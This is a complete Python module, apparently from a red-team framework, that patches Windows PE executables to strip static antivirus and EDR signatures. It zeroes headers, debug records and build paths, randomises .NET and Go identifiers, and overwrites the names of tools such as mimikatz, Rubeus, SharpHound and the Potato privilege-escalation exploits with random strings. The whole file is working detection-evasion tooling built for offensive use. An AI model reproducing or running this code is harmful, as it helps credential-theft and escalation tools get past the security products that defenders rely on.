"""
builders/pe_patcher.py — generic PE signature eradicator.

Strips static AV/EDR signatures, user/machine metadata, and debug artifacts
from any PE binary (native or .NET managed) while preserving functionality.

Patches applied to ALL PE files:
  1. PE header: Rich header zeroed, TimeDateStamp randomised, section names
     randomised, debug directory pointer zeroed.
  2. Win32 version resource: zeroed (ProductName, FileDescription, company, etc.)
  3. RSDS debug records: PDB path strings zeroed (removes build-machine paths).
  4. Build/source paths: C:\\Users\\..., /home/... → zeroed in-place.
  5. Binary sweep: toolname variants + known red-team strings → random same-length.
  6. PE checksum recalculated.

Additional patches for .NET managed assemblies (CLR directory present):
  7. #GUID heap: module MVID replaced with random GUID.
  8. #Strings heap: namespace tokens matching toolname replaced in-place.
  9. #US heap: user string blocks with toolname → same-length random content.

Go binaries (go.buildinfo present):
  10. Go build ID field replaced with random hex of the same length.

Usage (standalone):
    python3 builders/pe_patcher.py /path/to/tool.exe [output.exe]

Usage (from Lilith):
    from builders.pe_patcher import patch_pe
    patched = patch_pe(raw_bytes, toolname="Rubeus")
"""

from __future__ import annotations

import os
import random
import secrets
import struct
import string
import sys
from typing import NamedTuple


# ── Random helpers ─────────────────────────────────────────────────────────────

def _rand_name(n: int) -> bytes:
    """Random n-byte alphanumeric string starting with a letter."""
    first = random.choice(string.ascii_lowercase).encode()
    rest  = "".join(random.choices(string.ascii_lowercase + string.digits, k=n-1)).encode()
    return first + rest


def _rand_hex(n: int) -> bytes:
    """Random n-byte hex string (lowercase)."""
    return secrets.token_hex(n // 2 + 1)[:n].encode()


# ── PE struct helpers ──────────────────────────────────────────────────────────

def _u16(b, off): return struct.unpack_from("<H", b, off)[0]
def _u32(b, off): return struct.unpack_from("<I", b, off)[0]
def _p16(b, off, v): struct.pack_into("<H", b, off, v)
def _p32(b, off, v): struct.pack_into("<I", b, off, v)


class PEInfo(NamedTuple):
    pe_off:       int
    opt_off:      int
    magic:        int     # 0x10b = PE32, 0x20b = PE32+
    num_sections: int
    sections:     list    # [(name, rva, vsize, raw_off, raw_size), ...]
    data_dirs:    list    # [(rva, size), ...] indexed by directory index


def _parse_pe(data: bytes) -> PEInfo:
    pe_off  = _u32(data, 0x3C)
    opt_off = pe_off + 24
    magic   = _u16(data, opt_off)
    num_sec = _u16(data, pe_off + 6)

    if magic == 0x10b:
        dd_off, n_dirs_off, sec_off = opt_off + 96, opt_off + 92, opt_off + 224
    else:
        dd_off, n_dirs_off, sec_off = opt_off + 112, opt_off + 108, opt_off + 240

    n_dirs = _u32(data, n_dirs_off)
    dirs = [(_u32(data, dd_off + i*8), _u32(data, dd_off + i*8 + 4))
            for i in range(min(n_dirs, 16))]

    sections = []
    for i in range(num_sec):
        base = sec_off + i * 40
        name     = data[base:base+8].rstrip(b"\x00").decode(errors="replace")
        vsize    = _u32(data, base + 8)
        rva      = _u32(data, base + 12)
        raw_size = _u32(data, base + 16)
        raw_off  = _u32(data, base + 20)
        sections.append((name, rva, vsize, raw_off, raw_size))

    return PEInfo(pe_off, opt_off, magic, num_sec, sections, dirs)


def _rva_to_off(pe: PEInfo, rva: int) -> int:
    for _name, s_rva, s_vsize, s_raw_off, s_raw_size in pe.sections:
        if s_rva <= rva < s_rva + max(s_vsize, s_raw_size):
            return s_raw_off + (rva - s_rva)
    raise ValueError(f"RVA 0x{rva:x} not in any section")


# ── Patch 1: PE headers ────────────────────────────────────────────────────────

def _patch_pe_headers(buf: bytearray) -> None:
    pe_off  = _u32(buf, 0x3C)
    opt_off = pe_off + 24
    magic   = _u16(buf, opt_off)

    # Randomise TimeDateStamp
    _p32(buf, pe_off + 8, secrets.randbits(32))

    # Zero Rich header (between DOS stub and PE signature)
    rich_idx = buf.rfind(b"Rich", 0x40, pe_off)
    if rich_idx != -1:
        for i in range(0x40, rich_idx + 8):
            buf[i] = 0

    # Randomise section names
    num_sec = _u16(buf, pe_off + 6)
    sec_hdr_off = opt_off + (224 if magic == 0x10b else 240)
    _SEC_POOL = [b".text", b".rdata", b".data", b".rsrc", b".reloc",
                 b".bss", b".edata", b".idata", b".pdata", b".tls", b".debug"]
    used: set = set()
    for i in range(num_sec):
        base = sec_hdr_off + i * 40
        while True:
            c = random.choice(_SEC_POOL)
            if c not in used:
                used.add(c)
                break
        buf[base:base+8] = c.ljust(8, b"\x00")

    # Zero debug directory entry (index 6)
    dd_base = opt_off + (96 if magic == 0x10b else 112)
    _p32(buf, dd_base + 6*8, 0)
    _p32(buf, dd_base + 6*8 + 4, 0)


# ── Patch 2: Win32 version resource ───────────────────────────────────────────

def _patch_version_resource(buf: bytearray, pe: PEInfo) -> None:
    """Zero the VS_VERSION_INFO resource block."""
    if len(pe.data_dirs) < 3:
        return
    rsrc_rva, _ = pe.data_dirs[2]
    if not rsrc_rva:
        return
    try:
        rsrc_off = _rva_to_off(pe, rsrc_rva)
    except ValueError:
        return

    num_named = _u16(buf, rsrc_off + 12)
    num_id    = _u16(buf, rsrc_off + 14)
    for i in range(num_named + num_id):
        entry_off = rsrc_off + 16 + i * 8
        id_val = _u32(buf, entry_off)
        offset = _u32(buf, entry_off + 4)
        if (id_val & 0x7FFFFFFF) != 16 or (id_val & 0x80000000):
            continue
        if not (offset & 0x80000000):
            continue
        sub_off = rsrc_off + (offset & 0x7FFFFFFF)
        n1 = _u16(buf, sub_off + 12) + _u16(buf, sub_off + 14)
        for j in range(n1):
            e1_off = sub_off + 16 + j * 8
            off1   = _u32(buf, e1_off + 4)
            if not (off1 & 0x80000000):
                continue
            sub2_off = rsrc_off + (off1 & 0x7FFFFFFF)
            n2 = _u16(buf, sub2_off + 12) + _u16(buf, sub2_off + 14)
            for k in range(n2):
                e2_off = sub2_off + 16 + k * 8
                off2   = _u32(buf, e2_off + 4)
                if off2 & 0x80000000:
                    continue
                leaf_off  = rsrc_off + off2
                data_rva  = _u32(buf, leaf_off)
                data_size = _u32(buf, leaf_off + 4)
                try:
                    data_off = _rva_to_off(pe, data_rva)
                    for x in range(min(data_size, 4096)):
                        buf[data_off + x] = 0
                except ValueError:
                    pass


# ── Patch 3: RSDS debug records (PDB paths) ────────────────────────────────────

def _patch_rsds_paths(buf: bytearray) -> int:
    """
    Find RSDS CodeView debug records and zero the embedded PDB path string.
    Format: "RSDS" (4) + GUID (16) + Age (4) + null-terminated PDB path.
    Returns count of records patched.
    """
    count = 0
    idx = 0
    while True:
        idx = buf.find(b"RSDS", idx)
        if idx == -1:
            break
        path_start = idx + 24  # 4 (sig) + 16 (GUID) + 4 (age)
        if path_start >= len(buf):
            break
        # Find end of null-terminated PDB path
        null_pos = buf.find(b"\x00", path_start, min(path_start + 512, len(buf)))
        if null_pos == -1:
            idx += 4
            continue
        path_bytes = bytes(buf[path_start:null_pos])
        # Sanity: should look like a path (contains \ or / and ends with .pdb)
        if (b"\\" in path_bytes or b"/" in path_bytes) and path_bytes:
            for i in range(path_start, null_pos):
                buf[i] = 0
            # Also zero the GUID (identifying build)
            for i in range(idx + 4, idx + 20):
                buf[i] = 0
            count += 1
        idx += 4
    return count


# ── Patch 4: Build/source paths ────────────────────────────────────────────────

_BUILD_PREFIXES: list[bytes] = [
    b"C:\\Users\\",
    b"C:\\users\\",
    b"c:\\Users\\",
    b"/home/",
    b"/root/",
    b"/Users/",          # macOS cross-compile artifacts
    b"C:\\source\\",
    b"C:\\Source\\",
    b"C:\\dev\\",
    b"C:\\Dev\\",
    b"C:\\build\\",
    b"C:\\Build\\",
    b"C:\\workspace\\",
    b"C:\\projects\\",
    b"C:\\Projects\\",
]

def _patch_build_paths(buf: bytearray) -> int:
    """
    Find embedded build/source paths and zero them in-place.
    Replaces everything from the prefix up to the next null byte, quote, or newline.
    Returns count of occurrences zeroed.
    """
    count = 0
    for prefix in _BUILD_PREFIXES:
        idx = 0
        while True:
            idx = buf.find(prefix, idx)
            if idx == -1:
                break
            # Find end of string: null, quote, newline, or 512 chars
            end = idx + len(prefix)
            limit = min(idx + 512, len(buf))
            while end < limit and buf[end] not in (0, ord('"'), ord("'"), ord('\n'), ord('\r')):
                end += 1
            for i in range(idx, end):
                buf[i] = 0
            count += 1
            idx = end
    return count


# ── Patch 5: Go build info ─────────────────────────────────────────────────────

def _patch_go_buildinfo(buf: bytearray) -> int:
    """
    Detect Go binaries via the go.buildinfo magic and randomise the build ID.
    The build ID is a hex string embedded right after the magic header.
    Returns 1 if patched, 0 otherwise.
    """
    # Go build info magic: \xff Go build ID: "<id>"\n
    magic = b"\xff Go build ID: \""
    idx = buf.find(magic)
    if idx == -1:
        return 0
    id_start = idx + len(magic)
    id_end   = buf.find(b'"', id_start, id_start + 256)
    if id_end == -1:
        return 0
    id_len = id_end - id_start
    # Replace with random hex of same length
    buf[id_start:id_end] = _rand_hex(id_len)
    return 1


# ── .NET metadata helpers ──────────────────────────────────────────────────────

class MetaStreams(NamedTuple):
    root_off: int
    strings:  tuple
    us:       tuple
    guid:     tuple
    blob:     tuple


def _parse_metadata(data: bytes) -> MetaStreams | None:
    root = data.find(b"BSJB")
    if root == -1:
        return None
    ver_len   = _u32(data, root + 12)
    flags_off = root + 16 + ver_len
    if flags_off % 4:
        flags_off += 4 - (flags_off % 4)
    n_streams = _u16(data, flags_off + 2)

    streams: dict[str, tuple] = {}
    hdr = flags_off + 4
    for _ in range(n_streams):
        rva  = _u32(data, hdr)
        size = _u32(data, hdr + 4)
        nend = data.index(b"\x00", hdr + 8)
        name = data[hdr+8:nend].decode()
        padded = ((nend - (hdr + 8) + 1) + 3) & ~3
        streams[name] = (root + rva, size)
        hdr = hdr + 8 + padded

    def get(k): return streams.get("#" + k, (0, 0))
    return MetaStreams(root, get("Strings"), get("US"), get("GUID"), get("Blob"))


def _patch_guid_heap(buf: bytearray, ms: MetaStreams) -> None:
    off, size = ms.guid
    if off and size >= 16:
        buf[off:off+16] = secrets.token_bytes(16)


def _patch_strings_heap(buf: bytearray, ms: MetaStreams, subs: dict) -> int:
    off, size = ms.strings
    if not off:
        return 0
    count = 0
    i, end = off, off + size
    while i < end:
        null = buf.find(b"\x00", i, end)
        null = null if null != -1 else end
        entry = bytes(buf[i:null])
        modified = entry
        for orig, repl in subs.items():
            if orig in modified:
                modified = modified.replace(orig, repl)
        if modified != entry:
            buf[i:null] = modified
            count += 1
        i = null + 1
    return count


def _patch_us_heap(buf: bytearray, ms: MetaStreams, subs: dict) -> int:
    off, size = ms.us
    if not off:
        return 0
    count = 0
    i, end = off + 1, off + size
    while i < end:
        b0 = buf[i]
        if b0 in (0, 0xFF):
            i += 1
            continue
        if b0 & 0x80 == 0:
            length, hdr_len = b0, 1
        elif b0 & 0xC0 == 0x80:
            if i + 1 >= end: break
            length, hdr_len = ((b0 & 0x3F) << 8) | buf[i+1], 2
        else:
            if i + 3 >= end: break
            length = ((b0 & 0x1F) << 24) | (buf[i+1] << 16) | (buf[i+2] << 8) | buf[i+3]
            hdr_len = 4
        if length == 0:
            i += hdr_len
            continue
        c_off, c_end = i + hdr_len, i + hdr_len + length
        if c_end > end:
            break
        chunk    = bytearray(buf[c_off:c_end])
        original = bytes(chunk)
        # Wide-char (UTF-16LE) substitution
        for orig, repl in subs.items():
            wo = orig.decode("ascii", errors="ignore").encode("utf-16-le")
            wr = repl.decode("ascii", errors="ignore").encode("utf-16-le")
            if len(wo) == len(wr):
                idx2 = 0
                while True:
                    idx2 = chunk.find(wo, idx2)
                    if idx2 == -1: break
                    chunk[idx2:idx2+len(wr)] = wr
                    idx2 += len(wr)
        # Narrow (ASCII bytes) substitution
        for orig, repl in subs.items():
            idx2 = 0
            while True:
                idx2 = chunk.find(orig, idx2)
                if idx2 == -1: break
                chunk[idx2:idx2+len(repl)] = repl
                idx2 += len(repl)
        if bytes(chunk) != original:
            buf[c_off:c_end] = chunk
            count += 1
        i = c_end
    return count


def _patch_binary_sweep(buf: bytearray, subs: dict) -> int:
    count = 0
    for orig, repl in subs.items():
        idx = 0
        while True:
            idx = buf.find(orig, idx)
            if idx == -1: break
            buf[idx:idx+len(orig)] = repl
            idx += len(orig)
            count += 1
    return count


# ── Checksum ───────────────────────────────────────────────────────────────────

def _recalculate_checksum(buf: bytearray) -> None:
    pe_off  = _u32(buf, 0x3C)
    opt_off = pe_off + 24
    ck_off  = opt_off + 64
    _p32(buf, ck_off, 0)
    total, cs = len(buf), 0
    for i in range(0, total - (total % 2), 2):
        cs += buf[i] | (buf[i+1] << 8)
        cs = (cs & 0xFFFF) + (cs >> 16)
    if total % 2:
        cs += buf[-1]
        cs = (cs & 0xFFFF) + (cs >> 16)
    cs = ((cs & 0xFFFF) + (cs >> 16)) + total
    _p32(buf, ck_off, cs & 0xFFFFFFFF)


# ── Substitution table ─────────────────────────────────────────────────────────

# Cross-tool known-bad strings (tool: sig_bytes).
# Each is replaced with a random same-length alphanumeric string at patch time.
_CROSS_TOOL_SIGS: list[bytes] = [
    b"mimikatz",    b"MIMIKATZ",    b"Mimikatz",
    b"sekurlsa",    b"SEKURLSA",
    b"lsadump",     b"LSADUMP",
    b"kerberos",    b"KERBEROS",
    b"bloodhound",  b"BloodHound",  b"BLOODHOUND",
    b"sharphound",  b"SharpHound",  b"SHARPHOUND",
    b"rubeus",      b"Rubeus",      b"RUBEUS",
    b"seatbelt",    b"Seatbelt",    b"SEATBELT",
    b"certify",     b"Certify",     b"CERTIFY",
    b"whisker",     b"Whisker",     b"WHISKER",
    b"snaffler",    b"Snaffler",    b"SNAFFLER",
    b"kerbrute",    b"Kerbrute",    b"KERBRUTE",
    b"chisel",      b"CHISEL",
    b"ligolo",      b"LIGOLO",
    b"lazagne",     b"LaZagne",     b"LAZAGNE",
    b"sharpup",     b"SharpUp",     b"SHARPUP",
    b"godpotato",   b"GodPotato",   b"GODPOTATO",
    b"juicypotato", b"JuicyPotato", b"JUICYPOTATO",
    b"printspoofer",b"PrintSpoofer",b"PRINTSPOOFER",
    b"roguepotato", b"RoguePotato", b"ROGUEPOTATO",
    b"efspotato",   b"EfsPotato",   b"EFSPOTATO",
    b"badpotato",   b"BadPotato",   b"BADPOTATO",
    b"sweetpotato", b"SweetPotato", b"SWEETPOTATO",
    b"krbrelayup",  b"KrbRelayUp",  b"KRBRELAYUP",
    b"sqlrecon",    b"SQLRecon",    b"SQLRECON",
    b"adsearch",    b"ADSearch",    b"ADSEARCH",
    b"sharpgpoabuse",b"SharpGPOAbuse",
    b"sharpdpapi",  b"SharpDPAPI",
    b"sharpchrome", b"SharpChrome",
    b"sharpdump",   b"SharpDump",
    b"runasc",      b"RunasCs",
]


def _make_subs(toolname: str) -> dict[bytes, bytes]:
    """
    Build substitution table for a specific toolname + cross-tool catalog.
    Every replacement is a random string of the SAME byte length as the original.
    """
    subs: dict[bytes, bytes] = {}

    def _add(orig: bytes) -> None:
        if orig not in subs:
            subs[orig] = _rand_name(len(orig))

    # Toolname variants (derived from filename stem)
    stem = toolname.strip()
    # Strip common suffixes that don't appear in namespaces
    for suffix in ("64", "32", "any", "x64", "x86", "NET4", "NET2", "windows", "amd64"):
        if stem.lower().endswith(suffix.lower()) and len(stem) > len(suffix) + 2:
            stem = stem[:-len(suffix)]

    if len(stem) >= 3:
        _add(stem.encode())
        _add(stem.lower().encode())
        _add(stem.upper().encode())
        # camelCase variant (first char lower)
        camel = stem[0].lower() + stem[1:]
        if camel != stem and camel != stem.lower():
            _add(camel.encode())

    # Cross-tool catalog — add only sigs NOT already covered by toolname (avoid dup lengths)
    existing_lengths = {len(k) for k in subs}
    for sig in _CROSS_TOOL_SIGS:
        # Add if the original sig hasn't been handled by the toolname subs
        if sig.lower() != stem.lower().encode() and sig not in subs:
            _add(sig)

    return subs


# ── Main entry point ───────────────────────────────────────────────────────────

def patch_pe(data: bytes, toolname: str | None = None) -> bytes:
    """
    Patch a PE binary to strip static AV/EDR signatures and user/machine metadata.

    Args:
        data:     Raw PE bytes (must start with MZ).
        toolname: Tool's base name (e.g. "Rubeus", "mimikatz"). Used to generate
                  substitution table. Derived from len-16 stem if None.

    Returns:
        Patched binary as bytes.  Raises ValueError for invalid PE input.
    """
    if data[:2] != b"MZ":
        raise ValueError("Not a valid PE (missing MZ header)")

    random.seed(secrets.randbits(32))

    if not toolname:
        toolname = "tool"

    subs = _make_subs(toolname)
    buf  = bytearray(data)

    try:
        pe = _parse_pe(data)
    except Exception as e:
        raise ValueError(f"PE parse failed: {e}")

    is_dotnet = b"BSJB" in data
    is_go     = b"\xff Go build ID:" in data or b"go.buildinfo" in data

    # --- .NET metadata ---
    if is_dotnet:
        ms = _parse_metadata(data)
        if ms:
            _patch_guid_heap(buf, ms)
            n = _patch_strings_heap(buf, ms, subs)
            print(f"    [.NET] #Strings: {n} token(s) replaced")
            n = _patch_us_heap(buf, ms, subs)
            print(f"    [.NET] #US heap: {n} string block(s) patched")

    # --- Go build ID ---
    if is_go:
        n = _patch_go_buildinfo(buf)
        if n:
            print(f"    [Go]  Build ID randomised")

    # --- Binary sweep ---
    n = _patch_binary_sweep(buf, subs)
    print(f"    Binary sweep: {n} raw occurrence(s) replaced")

    # --- RSDS PDB paths (build machine) ---
    n = _patch_rsds_paths(buf)
    if n:
        print(f"    RSDS:  {n} PDB path(s) zeroed")

    # --- Build/source paths ---
    n = _patch_build_paths(buf)
    if n:
        print(f"    Paths: {n} build path(s) zeroed")

    # --- Version resource ---
    _patch_version_resource(buf, pe)

    # --- PE headers ---
    _patch_pe_headers(buf)

    # --- Checksum ---
    _recalculate_checksum(buf)

    # Verify no original toolname survives
    stem_b = toolname.encode()
    remaining = bytes(buf).count(stem_b)
    if remaining:
        print(f"    [!] {remaining} residual '{toolname}' occurrence(s) remain")
    else:
        print(f"    [+] {toolname}: all signatures removed")

    return bytes(buf)


# ── CLI ────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <tool.exe> [output.exe]")
        sys.exit(1)

    src = sys.argv[1]
    if not os.path.exists(src):
        print(f"[!] File not found: {src}")
        sys.exit(1)

    with open(src, "rb") as f:
        raw = f.read()

    stem = os.path.splitext(os.path.basename(src))[0]
    print(f"[*] {src} ({len(raw):,} bytes) — toolname: {stem}")

    dst = sys.argv[2] if len(sys.argv) > 2 else os.path.splitext(src)[0] + "_clean.exe"

    patched = patch_pe(raw, toolname=stem)

    with open(dst, "wb") as f:
        f.write(patched)

    print(f"[+] → {dst} ({len(patched):,} bytes)")
